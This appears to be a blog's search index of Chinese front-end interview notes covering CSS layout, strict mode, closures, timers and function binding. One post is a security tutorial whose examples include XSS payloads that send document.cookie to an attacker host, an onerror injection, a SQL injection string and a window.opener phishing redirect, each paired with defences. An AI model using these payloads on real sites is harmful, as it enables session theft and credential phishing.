<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[前端面试要点简述（一）]]></title>
    <url>%2F%E5%90%84%E7%A7%8Dheight.html</url>
    <content type="text"><![CDATA[各种height以下针对textarea： height：即元素的style.height clientHeight：可视内容所占的高度height+paddingTop+paddingBottom-横向滚动条的高度（通常为17px）即clientHeight=height+2+2-17 offsetHeight：即元素外尺寸offsetHeight = 上下padding + height + 上下border=height+2+2+1+1 scrollHeight：指的是包含滚动内容的元素大小（元素内容的总高度）不同浏览器处理方式不同，IE6、IE7 认为scrollHeight 是内容高度，可以小于clientHeight。FF 认为scrollHeight 是内容高度，不过最小值是clientHeight。但是scrollHeight &gt;=paddingTop + paddingBottom + 内容margin box的高度 严格模式？设立”严格模式”的目的 消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为; 消除代码运行的一些不安全之处，保证代码运行的安全；提高编译器效率，增加运行速度； 为未来新版本的Javascript做好铺垫。 语法和行为改变（常见） 禁用默认全局变量在正常模式中，如果一个变量没有声明就赋值，默认是全局变量。严格模式禁止这种用法，全局变量必须显式声明 静态绑定Javascript语言的一个特点，就是允许”动态绑定”，即某些属性和方法到底属于哪一个对象，不是在编译时确定的，而是在运行时（runtime）确定的。严格模式对动态绑定做了一些限制。某些情况下，只允许静态绑定。也就是说，属性和方法到底归属哪个对象，在编译阶段就确定。这样做有利于编译效率的提高，也使得代码更容易阅读，更少出现意外。主要是：禁止使用with语句&amp;创设eval作用域 禁止删除变量严格模式下无法删除变量。只有configurable设置为true的对象属性，才能被删除。 重名错误对象不能有重名的属性&amp;函数不能有重名的参数，同时注意严格模式下不能够调用caller和arguments.callee 禁止八进制表示法正常模式下，整数的第一位如果是0，表示这是八进制数，比如0100等于十进制的64。严格模式禁止这种表示法，整数第一位为0，将报错。 新增保留字为了向将来Javascript的新版本过渡，严格模式新增了一些保留字：implements, interface, let, package, private, protected, public, static, yield。使用这些词作为变量名将会报错。 BFC？应用？BFC解释块级格式化上下文，它是指一个独立的块级渲染区域，只有Block-level Box参与，该区域拥有一套渲染规则来约束块级盒子的布局，且与区域外部无关。 BFC如何生成 float的值不为none； overflow的值不为visible； display的值为inline-block、table-cell、table-caption； position的值为absolute或fixed； display：table可以生成BFC的主要原因在于Table会默认生成一个匿名的table-cell，正是这个匿名的table-cell生成了BFC。 BFC的约束规则 生成BFC元素的子元素会一个接一个的放置。垂直方向上他们的起点是一个包含块的顶部，俩个相邻子元素之间垂直距离取决于元素margin特性。在BFC中相邻的块级元素外边距会折叠。 生成BFC元素的子元素中，每一个子元素的外边距和包含块的左边界相接触，（对于从右到左的格式化，右外边距和右边界相接触），除非这个子元素也创建了一个新的BFC（如它自身也是一个浮动元素）。 BFC在布局中的应用 防止margin重叠：同一个BFC中两个相邻的box才会发生重叠与方向无关，不过由于约束规则第一条的限制，我们甚少看到水平方向的margin重叠。这在IE这中是个特例，IE可以设置write-mode。要阻止margin重叠，只要将两个元素别放在一个BFC中即可（可以用上文提到的BFC生成方式让相邻元素其中一个生成BFC）。阻止两个相邻元素的重叠看起来没有意义，主要用于嵌套元素。 浮动相关问题：使得父元素包含子元素，常见的方式是为父元素设置overflow：hidden或者浮动父元素。根本原因在于创建BFC的元素，子浮动元素也会参与其高度计算，即不会产生高度塌陷问题。 多栏布局的一种方式上文提到的一条规则：与浮动元素相邻的已生成BFC的元素不能与浮动元素互相覆盖。利用该特性可以作为多栏布局的一种实现方式。这种布局的特点在于左右俩栏的宽度固定，中间栏可以根据浏览器宽度自适应。左float，右float，中间通过overflow：hidden触发BFC 其他规则总结 内部的BOX会在垂直方向上一个接一个的放置； 垂直方向上的距离有margin决定。（完整的说法是：属于同一个BFC的俩个相邻的BOX的margin会发生重叠，与方向无关。） 每个元素的左外边距与包含块的左边界相接触（从左到右），即使浮动元素也是如此。（这说明BFC中的子元素不会超出它的包含块，而position为absolute的元素可以超出它的包含块边界）； BFC的区域不会与float的元素区域重叠； 计算BFC的高度时，浮动子元素也参与计算； BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素，反之亦然；]]></content>
  </entry>
  <entry>
    <title><![CDATA[简单聊聊常见的前端安全问题]]></title>
    <url>%2Fsecurity-of-FE.html</url>
    <content type="text"><![CDATA[曾经的梦想是当个黑客，现在，算是圆了半个梦吧。 XSS攻击全名叫做Cross-site scripting，即跨域脚本攻击，重点在于“跨域”和“客户端执行”。咱们来举个栗子~ 基于反射的XSS攻击全名：Reflected XSS，主要依靠站点服务端返回脚本，在客户端触发执行从而发起WEB攻击。假设有个买书网站：book.com，我们在其中搜索一本不存在的书籍，例如：“一天一颗蛋的开心的蛋是什么蛋？”，此时页面会发出请求book.com/search?name=一天一颗蛋的开心的蛋是什么蛋？，之后返回一条消息：您搜索的书籍&quot;一天一颗蛋的开心的蛋是什么蛋？&quot;不存在那么如果这个页面对于前端的输出数据没有进行稳妥的处理的话，我们可以尝试这么搜索：1&lt;script&gt;alert('我这儿有啊！来我这儿买！')&lt;/script&gt; 那么结果自然就是显示一个弹窗。那接下来如何实现攻击呢？要攻击咱们就要获取用户的数据，要获取数据自然要把信息传回我们的服务器（假设接收信息的地址是http://kayson/get），那咱们可以这样写：1&lt;script&gt;document.location='http://kayson/get?cookie='+document.cookie&lt;/script&gt; 但是呢，这样获取的都是我们自己的数据，没什么意义，我们需要的是别人的数据，所以咱们可以通过QQ群、微信群来群发，让别人来点击这个地址：1book.com/search?name=&lt;script&gt;document.location=&apos;http://kayson/get?cookie=&apos;+document.cookie&lt;/script&gt; 如何防御目前来讲，最简单的办法防治办法，还是将前端输出数据都进行转义最为稳妥。比如，按照刚刚我们那个例子来说，其本质是，浏览器遇到script标签的话，则会执行其中的脚本。但是如果我们将script标签的进行转义，则浏览器便不会认为其是一个标签，但是显示的时候，还是会按照正常的方式去显示。在php中有htmlentities这个方法，可以转义左右尖括号，JavaScript中我们可以这样写：123function htmlEntities(str) &#123; return String(str).replace(/&amp;/g, '&amp;amp;').replace(/&lt;/g, '&amp;lt;').replace(/&gt;/g, '&amp;gt;').replace(/"/g, '&amp;quot;');&#125; 但是，道高一尺魔高一丈，要知道直接给innerHTML赋值一段js是无法被执行的：1$('div').innerHTML = '&lt;script&gt;alert("it's ok!");&lt;/script&gt;'; 但是，jquery的append可以做到，究其原因，就是因为jquery会在将append元素变为fragment的时候，找到其中的script标签，再使用eval执行一遍。jquery的append使用的方式也是innerHTML。而innerHTML是会将unicode码转换为字符实体的。利用这两种知识结合，我们可以得出，如果网站使用Qquery的append进行dom操作，那么我们可以将左右尖括号，使用unicode码伪装起来，就像\u003cscript\u003ealert(&#39;okok&#39;);。接下来转义的时候，伪装成\u003的&lt;会被漏掉，append的时候，则会被重新调用。但但是！防住了script，咱们还得来看看imgimg标签，在加载图片失败的时候，会调用该元素上的onerror事件。我们正可以利用这种方式来进行攻击。正常的用户分享图片：12345678910111213141516171819202122232425&lt;?php $username="&lt;script&gt;alert('kayson');&lt;/script&gt;"; $imgsrc="http://baidu.com?0.jpg";?&gt;&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8" /&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; 用户名：&lt;?php echo htmlentities($username);?&gt; &lt;/div&gt; &lt;div&gt; 这个是图片： &lt;img src="&lt;?php echo $imgsrc;?&gt;" /&gt; &lt;/div&gt; &lt;div&gt; 2 &lt;/div&gt; &lt;div&gt; 3 &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 此时会正常显示图片，但如果我们将图片地址换一种写法：1$imgsrc="\" onerror=\"javascript:alert('kayson');\""; 那么img标签就会被拼接成为：1&lt;img src="\" onerror=\"javascript:alert('kayson'); /&gt; 攻击完成。至于防御手段嘛，和上面一样，转义一下就好。注！！其实在现在浏览器，这些反射型的XSS最好的防御方法就是设置一下cookie的http-only属性，这样就不能通过document.cookied的方式获取cookie了。 基于DOM或本地的XSS攻击全名：DOM-based or local XSS，也举个栗子，现在常见的为用户提供的免费WiFi，提供免费wifi的网关会往你访问的任何页面插入一段脚本，从而植入悬浮广告（当然你可以关闭它），这貌似没什么，但如果插入的脚本是获取你敏感数据的恶意脚本那就不一样了。像这种直接存在于页面，无须经过服务器返回脚本处理就直接跨域发送用户信息的行为就是基于本地的XSS攻击。 DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过js脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。 可能触发DOM行XSS攻击的属性 document.referer属性 window.name属性 location属性 innerHTML属性 documen.write属性 实例：1&lt;script&gt;var img=document.createElement("img");img.src="http://10.10.10.151:1234/a?"+escape(document.cookie);&lt;/script&gt; 防御：DOM型XSS主要是由客户端的脚本通过DOM动态地输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。其防御在于：（1） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现；（2） 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码转义，如输出到HTML则进行HTML编码、输出到则进行JS编码。 基于存储的XSS攻击全名：Stored XSS，它是通过贴吧啊博客园啊等地方来发表带有恶意跨域脚本的帖子或文章，从而把恶意脚本存储在里面，每个访问该帖子/文章的人就会中招。 CSRF攻击全名：Cross-site request forgery，即跨站请求伪造。也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。其实就是网站中的一些提交行为，被黑客利用，你在访问黑客的网站的时候，进行的操作，会被操作到其他网站上。XSS是利用用户对当前网站的信任来发起攻击，而CSRF是利用网站对用户的信任来发起攻击。 如何攻击依旧拿上述的图买书的站点打个比方，如果它的安全机制很松懈——只要用户登录了网站后，只要没关闭浏览器，在任何情况都可以作为一个已通过身份验证的用户来做购书、借书操作（无须重新登录或者输入支付密码什么的）。那么我们给一位用户发送一份邮件，里面放有一条转向购书执行页面的链接或者，在邮件中插入一张图片：1&lt;img src='http://book.com/pay?bookid=100'/&gt; img、script、iframe标签都是不受同源策略限制的，假设你使用的邮箱很直白地给用户即时显示这张图片，而该用户又刚好登录了book.com且没有关闭浏览器，那么src里的连接就会立刻访问book.com/pay页面，并按照已通过身份验证的情况来处理，从而做了购书的操作。相信现在你会很清楚为何现在的邮箱都不会直接显示邮件里的图片了吧——都是为了你的安全考虑。 如何防御对于CSRF攻击，我们所能做的可以有： 检查报头中的Referer参数确保请求发自正确的网站（但XHR请求可调用setRequestHeader方法来修改Referer报头）； 对于任何重要的请求都需要重新验证用户的身份； 创建一个唯一的令牌（Token），将其存在服务端的session中及客户端的cookie中，对任何请求，都检查二者是否一致。 注入攻击这里包括了SQL注入、XPath注入、cgi命令执行，还有XXS和会话劫持等。前三个的攻击主要是在服务端触发的，后二者的攻击则是侧重于客户端。就简单说说SQL注入吧。又是那个倒霉的买书的网站，你点进一本书的详情页面，其url是这样的：book.com/book?id=100说明这本书在数据库中的键值是100，后端收到url参数后就执行了数据库查询操作：select * from booktable where id=&#39;100&#39;那么如果我们把url更改为book.com/book?id=100&#39;or&#39;1&#39;=&#39;1那么数据库操作执行就变成了：select * from booktable where id=&#39;100&#39;or&#39;1&#39;=&#39;1&#39;从而取出了整个booktable 表单的全部数据。XPath注入跟SQL注入差不多，只不过这里的数据库走的xml格式，攻击方式自然也得按xml查找的语法来了cgi命令执行指的是用户远程访问cgi脚本时，通过提交恶意的参数让服务器执行相关的cgi命令来获取信息甚至操纵服务器。对于这几个攻击，我们需要做的自然是对提交参数的过滤，最好是前端过滤一遍，后端也过滤一遍（后端的过滤和拦截是最重要的，毕竟通过在浏览器禁用脚本的配置可以躲过前端的过滤）。 钓鱼网站钓鱼也是一种非常古老的攻击方式了，曾经，不，现在也常有，QQ群里面有人发什么兼职啊美女啊啥的，详情在我的QQ空间之类的，打开之后发现一个QQ登录框，其实一看域名就知道不是QQ，不过做得非常像QQ登录，不明就里的用户们，就真的把用户名和密码输入了进去，结果没登录到QQ，用户名和密码却给人发过去了。其实这种方式，在前端也有利用。下面，我们就来试试如果利用前端进行一次逼真的钓鱼。首先，我们在某某空间里分享一篇文章，然后吸引别人去点击。1234567891011121314151617&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8" /&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; 当前你在QQ空间 &lt;/div&gt; &lt;h1&gt;kayson的分享&lt;/h1&gt; &lt;section&gt; 咱们班当年班花，现在长这样： &lt;!--这是咱们的钓鱼网站--&gt; &lt;a href="http://localhost:8080/cheat.html" target="_blank"&gt;点我查看&lt;/a&gt; &lt;/section&gt; &lt;/body&gt;&lt;/html&gt; 接着，我们在cheat.html这个网站上面，将跳转过来的源网页地址悄悄的进行修改。12345678910111213141516&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8" /&gt; &lt;script src="../lib/jquery.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; 你想看的信息： xxxxxxxxxxxxxx xxxxxxxxxxxxxx &lt;script&gt; // 在用户不知情的情况下，对跳转的来源网页进行地址替换 window.opener.location = 'http://localhost:8080/myfishsite.html'; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 于是，在用户访问了我们的欺骗网站后，之前的tab已经悄然发生了变化，我们将其悄悄的替换为了钓鱼的网站，欺骗用户输入用户名、密码等。然后我们的钓鱼网站，伪装成某某空间，让用户输入用户名与密码即可。 在开发时要注意什么？ 开发时要提防用户产生的内容，要对用户输入的信息进行层层检测 要注意对用户的输出内容进行过滤(进行转义等) 重要的内容记得要加密传输(无论是利用https也好，自己加密也好) get请求与post请求，要严格遵守规范，不要混用，不要将一些危险的提交使用jsonp完成。 对于URL上携带的信息，要谨慎使用。 心中时刻记着，自己的网站哪里可能有危险。]]></content>
      <categories>
        <category>前端面试</category>
      </categories>
      <tags>
        <tag>前端安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[闭包究竟是什么？]]></title>
    <url>%2Fclosure.html</url>
    <content type="text"><![CDATA[作为一名合格的程序员，英文能力是必不可少的，因此我在接触一个知识点的时候总习惯于去记一记它的洋名。闭包叫啥呢？closure！closure！closure！ 借引Douglas Crockford的一句话：之所以能够在JS中实现公有、私有和特权变量，就是因为闭包的存在。闭包是指在JS中，内部函数总是可以访问其所在的外部函数中声明的参数和变量，即使是在其外部函数被返回（或者说是寿命终结或者说是上下文环境出栈）了之后。又，因为函数是JS中唯一拥有自身作用域的结构，因此闭包的创建总是依赖于函数，总是会有return。 经典面试题对闭包的理解？实现一个隐藏内部变量，但外部可以通过函数接口访问和修改内部变量的函数（get和set，闭包实现）第一答：你可以接引Douglas Crockford的话第二答：show him the code!123456789101112131415161718var foo = (function () &#123; //闭包内的函数可以访问secret变量，而secret变量对于外部是隐藏的 var secret = 'secret'; return &#123; get_secret: function () &#123; //通过定义的接口来访问secret return secret; &#125;, new_secret: function (new_secret) &#123; //通过定义的接口来修改secret secret = new_secret; &#125; &#125;;&#125;());foo.get_secret(); //'secret'foo.secret; //Type errorfoo.new_secret('a new secret'); //通过函数接口，我们访问并修改了secret变量foo.get_secret(); //'a new secret' 闭包的特性 封闭性：外界无法访问闭包内部的数据，如果在闭包内声明变量，外界是无法访问的，除非闭包主动向外界提供访问接口 持久性：一般的函数，调用完毕之后，系统自动注销函数，而对于闭包来说，在外部函数被调用之后，闭包结构依然保存在系统中，闭包中的数据依然存在，从而实现对数据的持久使用。 优点 减少全局变量 减少传递函数的参数量 封装 缺点 使用闭包会占有内存资源 过多的使用闭包会导致内存溢出 闭包应用之延迟函数setTimeout根据HTML 5标准，setTimeout推迟执行的时间，最少是5毫秒。如果小于这个值，会被自动增加到5ms。每一个setTimeout在执行时，会返回一个唯一ID，把该ID保存在一个变量中，并传入clearTimeout，可以清除定时器。在setTimeout内部，this绑定采用默认绑定规则，也就是说，在非严格模式下，this会指向window；而在严格模式下，this指向undefined。 一、用setTimeout代替setInterval由于setInterval间歇调用定时器会因为在定时器代码未执行完毕时又向任务队列中添加定时器代码，导致某些间隔被跳过等问题，所以应使用setTimeout代替setInterval。 1234567setTimeout(function myTimer() &#123; /** * 需要执行的代码 * setTimeout会等到定时器代码执行完毕后才会重新调用自身（递归），记得给匿名函数添加一个函数名，以便调用自身。 */ setTimeout(myTimer, 1000);&#125;, 1000); 这样做的好处是，在前一个定时器执行完毕之前，不会向任务队列中插入新的定时器代码，可以避免任何缺失的间隔，还可以保证在下一次定时器代码执行前，至少要等待指定的间隔，避免了连续执行。这个模式主要用于重复定时器。1234567891011// 代码段1，间歇性输出1到10let num = 0;let max = 10;setTimeout(function myTimer() &#123; num++; console.log(num); if (num === max) &#123; return; &#125; setTimeout(myTimer, 500);&#125;, 500); 12345678// 代码段2，间歇性输出1到10setTimeout(function myTimer() &#123; num++; console.log(num); if (num &lt; max) &#123; setTimeout(myTimer, 500); &#125;&#125;, 500); 二、在for循环中创建setTimeout定时器 根据事件循环和任务队列的原理，定时器通常在循环结束后才会加入到任务队列执行。 定时器是循环创建的。 定时器几乎是同时开始计时的。 定时器中的回调函数属于闭包，包含着对循环后全局变量i的引用。在块作用域和定时器外创建一个函数作用域时，此时不会查找全局作用域。 定时器的第二个参数不属于闭包的一部分，其值与循环i的值相同。 程序运行遵循同步优先，异步靠边，回调垫底。1234567// 代码段1，输出6个5for (var i = 0; i &lt; 5; i++) &#123; setTimeout(function() &#123; console.log(i); &#125;, 1000 * i);&#125;console.log(i); 第1个5直接输出，1 秒之后，输出 5 个 5，并且每隔1s输出一个，一共用时4s。for循环和循环体外部的console是同步的，所以先执行for循环，再执行外部的console.log。等for循环执行完，就会给setTimeout传参，最后执行。JavaScript单线程如何处理回调呢？JavaScript同步的代码是在堆栈中顺序执行的，而setTimeout回调会先放到消息队列，for循环每执行一次，就会放一个setTimeout到消息队列排队等候，当同步的代码执行完了，再去调用消息队列的回调方法。这个消息队列执行的时间，需要等待到函数调用栈清空之后才开始执行。即所有可执行代码执行完毕之后，才会开始执行由setTimeout定义的操作。而这些操作进入队列的顺序，则由设定的延迟时间来决定，消息队列遵循先进先出（FIFO）原则。因此，即使我们将延迟时间设置为0，它定义的操作仍然需要等待所有代码执行完毕后才开始执行。这里的延迟时间，并非相对于setTimeout执行这一刻，而是相对于其他代码执行完毕这一刻。先执行for循环，按顺序放了5个setTimeout回调到消息队列，然后for循环结束，下面还有一个同步的console，执行完console之后，堆栈中已经没有同步的代码了，就去消息队列找，发现找到了5个setTimeout，注意setTimeout是有顺序的。JavaScript在把setTimeout放到消息队列的过程中，循环的i是不会及时保存进去的，相当于你写了一个异步的方法，但是ajax的结果还没返回，只能等到返回之后才能传参到异步函数中。for循环结束之后，因为i是用var定义的，所以var是全局变量（这里没有函数，如果有就是函数内部的变量），这个时候的i是5，从外部的console输出结果就可以知道。那么当执行setTimeout的时候，由于全局变量的i已经是5了，所以传入setTimeout中的每个参数都是5。很多人都会以为setTimeout里面的i是for循环过程中的i，这种理解是不对的。因此，即使我们将延迟时间设置为0，它定义的操作仍然需要等待所有代码执行完毕后才开始执行。这里的延迟时间，并非相对于setTimeout执行这一刻，而是相对于其他代码执行完毕这一刻。123456for (var i = 0; i &lt; 5; i++) &#123; console.log(i); setTimeout(function myTimer() &#123; console.log(i); &#125;, i * 1000);&#125; 立刻输出0 1 2 3 4间歇性输出5个5温馨提示：如果在开发者工具console面板运行这段程序，你会看到不一样的结果。立刻输出0 1 2 3 4立即输出定时器ID间歇性输出5个512345for (var i = 0; i &lt; 5; i++) &#123; setTimeout((function() &#123; console.log(i); &#125;)(), 1000 * i);&#125; 立即输出0 1 2 3 4。因为setTimeout的第一个参数是函数或者字符串，而此时函数又立即执行了。因此，定时器失效，直接输出0 1 2 3 4。12345for (var i = 0; i &lt; 5; i++) &#123; (function() &#123; console.log(i); &#125;)();&#125; 该程序也是立即输出0 1 2 3 4。 三、如何让程序间歇性输出0 1 2 3 4？这里有两种思路，不过原理都相同。思路1：ES6 let关键字，给setTimeout定时器外层创建一个块作用域。12345for (let i = 0; i &lt; 5; i++) &#123; setTimeout(function() &#123; console.log(i); &#125;, 1000 * i);&#125; 思路1的另一种表达123456for (var i = 0; i &lt; 5; i++) &#123; let j = i; //闭包的块作用域 setTimeout(function() &#123; console.log(j); &#125;, 1000 * j);&#125; 思路2：IIFE，创建函数作用域以形成闭包。Immediately Invoked Function Expression：声明即执行的函数表达式。1234567for (var i = 0; i &lt; 5; i++) &#123; (function iife(j) &#123; //闭包的函数作用域 setTimeout(function() &#123; console.log(j); &#125;, 1000 * i); //这里将i换为j, 可以证明以上的想法。 &#125;)(i);&#125; 给定时器外层创建了一个IIFE，并且传入变量i。此时，setTimeout会形成一个闭包，记住并且可以访问所在的词法作用域。因此，会间歇输出0 1 2 3 4。实际上，函数参数，就相当于函数内部定义的局部变量，因此下面的写法也是可以的，思路2的另一种表达。12345678for (var i = 0; i &lt; 5; i++) &#123; (function iife() &#123; var j = i; setTimeout(function() &#123; console.log(j); &#125;, 1000 * i); //如果这里将i换为j, 可以证明以上的想法。 &#125;)();&#125; 思路3123456789var myTimer = function (i) &#123; setTimeout(function() &#123; console.log(i); &#125;, 1000);&#125;;for (var i = 0; i &lt; 5; i++) &#123; myTimer(i); //这里传过去的i值被复制了&#125;console.log(i);//5 代码执行时，立即输出5，之后每隔1秒依次立刻输出0 1 2 3 4。 四、如何让程序间歇性输出0 1 2 3 4 5？思路112345678910for (var i = 0; i &lt; 5; i++) &#123; (function(j) &#123; setTimeout(function() &#123; console.log( j); &#125;, 1000 * j); //这里修改0~4的定时器时间 &#125;)(i);&#125;setTimeout(function() &#123; //这里增加定时器，超时设置为5秒 console.log(i);&#125;, 1000 * i); 我们都知道使用Promise处理异步代码比回调机制让代码可读性更高，但是使用Promise的问题也很明显，即如果没有处理Promise的reject，会导致错误被丢进黑洞，好在新版的Chrome和Node 7.x 能对未处理的异常给出Unhandled Rejection Warning，而排查这些错误还需要一些特别的技巧（浏览器、Node.js）思路21234567891011121314151617const myArr = [];for (var i = 0; i &lt; 5; i++) &#123; // 这里i的声明不能改成let，如果要改该怎么做？ ((j) =&gt; &#123; myArr.push(new Promise((resolve) =&gt; &#123; setTimeout(() =&gt; &#123; console.log(new Date, j); resolve(); //这里一定要resolve，否则代码不会按预期执行 &#125;, 1000 * j); //定时器的超时时间逐步增加 &#125;)); &#125;)(i);&#125;Promise.all(myArr).then(() =&gt; &#123; setTimeout(() =&gt; &#123; console.log(new Date, i); &#125;, 1000); // 注意这里只需要把超时设置为1秒&#125;); 思路31234567891011121314151617const myArr = []; //这里存放异步操作的Promiseconst myTimer = (i) =&gt; new Promise((resolve) =&gt; &#123; setTimeout(() =&gt; &#123; console.log(new Date, i); resolve(); &#125;, 1000 * i);&#125;);// 生成全部的异步操作for (var i = 0; i &lt; 5; i++) &#123; myArr.push(myTimer(i));&#125;// 异步操作完成之后，输出最后的 iPromise.all(myArr).then(() =&gt; &#123; setTimeout(() =&gt; &#123; console.log(new Date, i); &#125;, 1000);&#125;); 思路4：使用ES7中的async await特性12345678910111213// 模拟其他语言中的sleep，实际上可以是任何异步操作。const sleep = (timeountMS) =&gt; new Promise((resolve) =&gt; &#123; setTimeout(resolve, timeountMS);&#125;);(async () =&gt; &#123; //声明即执行的async函数表达式 for (var i = 0; i &lt; 5; i++) &#123; await sleep(1000); console.log(new Date, i); &#125; await sleep(1000); console.log(new Date, i);&#125;)(); 五、清除定时器123456789function fn1()&#123; for(var i = 0;i &lt; 5; i++)&#123; var tc = setTimeout(function(i)&#123; console.log(i); clearTimeout(tc); &#125;,10,i); &#125;&#125;fn1();//0 1 2 3 解读fn1，这个tc是定义在闭包外面的，也就是说tc并没有被闭包保存，所以这里的tc指的是最后一个循环留下来的tc，所以最后一个4被清除了，没有输出。123456789function fn2()&#123; for(var i = 0;i &lt; 5; i++)&#123; var tc = setInterval(function(i,tc)&#123; console.log(i); clearInterval(tc); &#125;,10,i,tc); &#125;&#125; fn2();//0 1 2 3 4 4 4 4 解读fn2，可以发现最后一个定时器没被删除。在浏览器中单步调试，在第一次循环的时候tc并没有被赋值，所以是undefined，在第二次循环的时候，定时器其实清理的是上一个循环的定时器。所以导致每次循环都是清理上一次的定时器，而最后一次循环的定时器没被清理，导致一直输出4。 六、来个小测试阅读下列程序，说出运行结果顺序。12345678910111213141516171819let a = new Promise( function(resolve, reject) &#123; console.log(1); setTimeout(() =&gt; console.log(2), 0); console.log(3); console.log(4); resolve(true); &#125;);a.then(v =&gt; &#123; console.log(8);&#125;);let b = new Promise( function() &#123; console.log(5); setTimeout(() =&gt; console.log(6), 0); &#125;)console.log(7); 输出结果：1 3 4 5 7 8 2 6。程序结果分析如下： a变量是一个Promise，Promise本身是同步的，Promise的then()和catch()方法是异步的，所以这里先执行a变量内部的Promise同步代码，输出1 3 4。（同步优先）至于setTimeout回调，先去消息队列排队等着吧。（回调垫底）执行resolve(true)，进入then()，then是异步，下面还有同步没执行呢，所以then也去消息队列排队等候吧。（异步靠边） b变量也是一个Promise，和a一样，执行内部的同步代码，输出5，setTimeout滚去消息队列排队等候。 最下面同步输出7。 同步的代码执行完了，JavaScript就跑去消息队列呼叫异步的代码。这里只有一个异步then，所以输出8。 异步执行结束，终于轮到回调啦。这里有2个回调在排队，他们的时间都设置为0，所以不受时间影响，只跟排队先后顺序有关。这时，先输出a里面的回调2，最后输出b里面的回调6。 我们还可以稍微做一点修改，把a里面Promise的 setTimeout(() =&gt; console.log(2), 0)改成 setTimeout(() =&gt; console.log(2), 2)，对，时间改成了2ms，为什么不改成1试试呢？1ms的话，浏览器都还没有反应过来呢。你改成大于或等于2的数字就能看到2个setTimeout的输出顺序发生了变化。所以回调函数正常情况下是在消息队列顺序执行的，但是使用setTimeout的时候，还需要注意时间的大小也会改变它的顺序。]]></content>
      <categories>
        <category>前端面试</category>
      </categories>
      <tags>
        <tag>闭包</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[绝对定位和相对定位]]></title>
    <url>%2Fcss%20relative%20and%20absolute.html</url>
    <content type="text"><![CDATA[position属性的相关定义1、static无特殊定位，它是html元素默认的定位方式，即我们不设定元素的position属性时默认的position值就是static，它遵循正常的文档流对象，对象占用文档空间，该定位方式下，top/left/right/bottom/index等属性是无效的。 2、relative遵循正常的文档流，top/left/right/bottom/z-inde属性是生效的，可以说它是static到absoult的一个中间过渡属性，最重要的是它还占有文档空间，而且占据的文档空间不会随top/left/right/bottom等属性的偏移而发生变动，也就是说它后面的元素是依据虚线位置( top / left / right / bottom 等属性生效之前)进行的定位，其层叠通过z-index属性定义。如果对relative应用margin属性，那么margin是占据了文档空间的！ 3、absolute对象脱离正常文档流，而其层叠通过z-index属性定义。根据position为非static的最近的直系祖先进行定位，直到html标签为止（relative和static方式在最外层时是以标签为定位原点的）。和元素相差9px左右。 划重点如果使用absoulte或fixed定位的话，必须指定 left、right、 top、 bottom 属性中的至少一个，否则left/right/top/bottom属性会使用它们的默认值 auto ，这将导致对象遵从正常的HTML布局规则，在前一个对象之后立即被呈递，简单讲就是都变成relative，会占用文档空间，使用top，right，bottom，left等属性进行绝对定位。 如果top和bottom一同存在的话，那么只有top生效。 如果left和right一同存在的话，那么只有left生效。 祖先类的margin会让子类的absoulte跟着偏移，而padding却不会让子类的absoulte发生偏移。总结一下，就是absoulte是根据祖先类的border进行的定位。 绝对(absolute)定位对象在可视区域之外会导致滚动条出现。而放置相对(relative)定位对象在可视区域之外，滚动条不会出现。 fixed相较于绝对定位，叫做固定定位。对象脱离正常文档流，使用top，right，bottom，left等属性以窗口为参考点进行定位，当出现滚动条时，对象不会随着滚动。而其层叠通过z-index属性定义。 fixed和absolute的区别 没有滚动条的情况下与absolute没有差异。 有滚动条的情况下，fixed不会随滚动条移动而移动，absolute会。 可以理解为absolute固定在最外层的window不动， fixed固定在当前视口不动]]></content>
      <categories>
        <category>前端面试</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[函数绑定和函数柯里化]]></title>
    <url>%2Fbind%20and%20curry.html</url>
    <content type="text"><![CDATA[本篇文章大量参考JavaScript高级程序设计第三版中js高级编程的内容 函数绑定一个简单的函数绑定在JavaScript与DOM交互中经常需要使用函数绑定，定义一个函数然后将其绑定到特定DOM元素或集合的某个事件触发程序上，绑定函数经常和回调函数及事件处理程序一起使用，以便把函数作为变量传递的同时保留代码执行环境。123456789101112&lt;body&gt;&lt;input id="btnTest" type="button" value="Button"/&gt; &lt;script type="text/javascript"&gt; var handler=&#123; message:"Event handled.", handlerFun:function()&#123; alert(this.message); &#125; &#125;; document.getElementById('btnTest').onclick=handler.handlerFun; &lt;/script&gt;&lt;/body&gt; 上面的例子创建了一个handler对象，handler.handlerFun()方法被分配为DOM按钮的click事件处理程序。设计意图是这样的：当点击按钮的时候触发该方法，弹出对话框显示handler定义的message，然而点击后对话框内容却是undefined。熟悉闭包的同学可以轻松看出来这个问题在于没有保存handler.handlerFun()方法的执行环境，this对象最后指向了DOM按钮而非handler。可以使用闭包解决此问题，修改函数绑定语句123document.getElementById('btnTest').onclick=function()&#123; handler.handlerFun();&#125; 